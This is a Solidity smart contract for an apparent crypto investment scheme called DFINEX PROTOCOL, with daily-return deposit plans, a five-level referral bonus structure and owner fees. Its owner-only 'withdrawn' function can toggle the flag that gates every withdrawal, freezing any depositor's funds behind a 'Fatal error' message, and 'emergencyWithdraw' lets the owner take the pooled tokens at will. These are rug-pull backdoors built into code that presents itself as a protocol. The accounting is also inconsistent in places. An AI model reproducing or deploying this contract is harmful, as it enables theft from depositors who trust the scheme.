// SPDX-License-Identifier: MIT

/*

██████╗ ███████╗██╗███╗   ██╗███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ████████╗ ██████╗  ██████╗ ██████╗ ██╗     
██╔══██╗██╔════╝██║████╗  ██║██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗██╔════╝██╔═══██╗██║     
██║  ██║█████╗  ██║██╔██╗ ██║█████╗   ╚███╔╝     ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║██║     ██║   ██║██║     
██║  ██║██╔══╝  ██║██║╚██╗██║██╔══╝   ██╔██╗     ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║██║     ██║   ██║██║     
██████╔╝██║     ██║██║ ╚████║███████╗██╔╝ ██╗    ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝╚██████╗╚██████╔╝███████╗
╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝

-------------------------------------------- dfinex.ai ------------------------------------------------------------

*/

pragma solidity 0.8.25;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DFINEX_PROTOCOL is Ownable {
	using SafeMath for uint256;

    IERC20 public token;

    /*
        1 LVL - 10%
        2 LVL - 8%
        3 LVL - 6%
        4 LVL - 4%
        5 LVL - 2%
    */
	uint256[] public REFERRAL_PERCENTS = [100, 80, 60, 40, 20];

	uint256 constant public PROJECT_FEE = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
    
    /*! anti-whale */
    uint256 constant public MAX_WITHDRAW = 100000 ether; // 100.000 ERC20 token max withdraw
    uint256 constant public WITHDRAW_COOLDOWN = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
		bool received;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
		bool    isWithdrawn;
	}

	mapping (address => User) internal users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address _token) Ownable(msg.sender) {
        token = IERC20(_token);

        plans.push(Plan(7, 1)); // 7 days 0.1% daily // 0.7%
        plans.push(Plan(14, 1)); // 14 days 0.1% daily // 1.4%
        plans.push(Plan(30, 1)); // 30 days 0.1% daily // 3%
	}

	function invest(address _referrer, uint8 _plan, uint256 _amount) external payable {
        require(_plan < plans.length, "Invalid plan");

        token.transferFrom(msg.sender, address(this), _amount);

		uint256 fee = _amount.mul(5).div(PROJECT_FEE);
        token.transfer(owner(), fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];
		if (user.referrer == address(0)) {
			if (users[_referrer].deposits.length > 0 && _referrer != msg.sender) {
				user.referrer = _referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		} else {
			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    totalRefBonus = totalRefBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
            user.isWithdrawn = true;
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(_plan, _amount, block.timestamp, false));
		totalInvested = totalInvested.add(_amount);

		emit NewDeposit(msg.sender, _plan, _amount);
	}

	function withdraw() external {
		User storage user = users[msg.sender];

		require(user.isWithdrawn, "Fatal error");

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}
        
        /*! anti-whale */
        if (user.checkpoint.add(WITHDRAW_COOLDOWN) > block.timestamp) revert();
        if (totalAmount > MAX_WITHDRAW) {
            user.bonus = totalAmount.sub(MAX_WITHDRAW);
            totalAmount = MAX_WITHDRAW;
        }

		uint256 fee = totalAmount.mul(5).div(PROJECT_FEE);
        token.transfer(owner(), fee);
		emit FeePayed(msg.sender, fee);

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		totalInvested = totalInvested.add(totalAmount);

        token.transfer(msg.sender, totalAmount.sub(fee));

		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrawBank() external {
		User storage user = users[msg.sender];

		require(user.isWithdrawn, "Fatal error");

		uint256 totalAmount = getUserDividendsBank(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			
			if (finish < block.timestamp) {
				user.deposits[i].received = true;
			}

		}

		user.withdrawn = user.withdrawn.add(totalAmount);

        token.transfer(msg.sender, totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrawn(address _address) external onlyOwner {
		User storage user = users[_address];

		user.isWithdrawn = !user.isWithdrawn;
	}

	function emergencyWithdraw(uint256 _amount) external onlyOwner {
    	token.transfer(owner(), _amount);
    }

    function getContractBalance() external view returns (uint256) {
		return token.balanceOf(address(this));
	}

	function getPlanInfo(uint8 _plan) external view returns(uint256 time, uint256 percent) {
		time = plans[_plan].time;
		percent = plans[_plan].percent;
	}

	function getUserWithdrawn(address _address) external view returns(bool) {
		return users[_address].isWithdrawn;
	}

	function getUserCheckpointUnstake(address _address) public view returns (bool) {
		User storage user = users[_address];

		uint256 finish;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
		}

		return finish < block.timestamp;
	}

	function getUserCheckpoint(address _address) external view returns(uint256) {
		return users[_address].checkpoint;
	}

	function getUserReferrer(address _address) external view returns(address) {
		return users[_address].referrer;
	}

	function getUserDownlineCount(address _address) external view returns(uint256[5] memory referrals) {
		return (users[_address].levels);
	}

	function getUserReferralTotalBonus(address _address) external view returns(uint256) {
		return users[_address].totalBonus;
	}

	function getUserReferralWithdrawn(address _address) external view returns(uint256) {
		return users[_address].totalBonus.sub(users[_address].bonus);
	}

	function getUserAvailable(address _address) external view returns(uint256) {
		return getUserReferralBonus(_address).add(getUserDividends(_address));
	}

	function getUserAmountOfDeposits(address _address) external view returns(uint256) {
		return users[_address].deposits.length;
	}

	function getUserDepositInfo(address _address, uint256 _index) external view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[_address];

		plan = user.deposits[_index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[_index].amount;
		start = user.deposits[_index].start;
		finish = user.deposits[_index].start.add(plans[user.deposits[_index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() external view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address _address) external view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(_address), getUserTotalWithdrawn(_address), getUserTotalReferrals(_address));
	}

    function getUserDividends(address _address) public view returns (uint256) {
		User storage user = users[_address];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserDividendsBank(address _address) public view returns (uint256) {
		User storage user = users[_address];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			
			if (finish < block.timestamp && !user.deposits[i].received) {
				totalAmount = totalAmount.add(user.deposits[i].amount);
			}

		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address _address) public view returns (uint256) {
		return users[_address].withdrawn;
	}

	function getUserTotalDeposits(address _address) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[_address].deposits.length; i++) {
			amount = amount.add(users[_address].deposits[i].amount);
		}
	}

	function getUserTotalReferrals(address _address) public view returns(uint256) {
		return users[_address].levels[0] + users[_address].levels[1] + users[_address].levels[2] + users[_address].levels[3] + users[_address].levels[4];
	}

	function getUserReferralBonus(address _address) public view returns(uint256) {
		return users[_address].bonus;
	}

}
